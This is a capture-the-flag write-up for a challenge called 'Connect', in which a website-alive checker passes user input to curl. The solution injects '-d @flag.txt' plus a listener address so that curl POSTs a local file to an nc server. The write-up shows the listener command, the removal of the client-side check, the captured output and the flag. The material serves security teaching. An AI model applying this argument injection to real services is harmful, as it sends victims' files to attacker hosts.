# Connect

Author: `Mr. Blade`

## Description

I built a tool to test if websites are alive. Can you test it for me?

Note: the flag is located in /flag.txt

## Dev Notes

<b>SOURCE CODE IS PROVIDED</b><br>
All files in `src/` are to be included in the challenge

Start: `make run`

Stop: `make stop`

## Solution

curl allows for the upload of file data. We can abuse this as neither `-` nor `@` are filtered.

On a publicly-facing server, start an nc server:

```bash
nc -nvlp 1337
```

Then, on the web page, delete the check for valid URL:

```js
try {
  new URL(host);
} catch {
  return output.innerHTML = "Illegal Characters Detected";
}
```

Finally, we trick curl into uploading data using `-d @file` to POST the content of `file` to our malicious server. We submit the following "IP" (crafted payload) to check:

```bash
-d @flag.txt http://172.17.0.1:1337
```

This causes the following data to be POST'd to our nc session:

```
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 172.17.0.3.
Ncat: Connection from 172.17.0.3:37624.
POST / HTTP/1.1
Host: 172.17.0.1:1337
User-Agent: curl/7.64.0
Accept: */*
Content-Length: 42
Content-Type: application/x-www-form-urlencoded

gigem{p00r_f1lt3rs_m4k3_f0r_p00r_s3cur1ty}
```
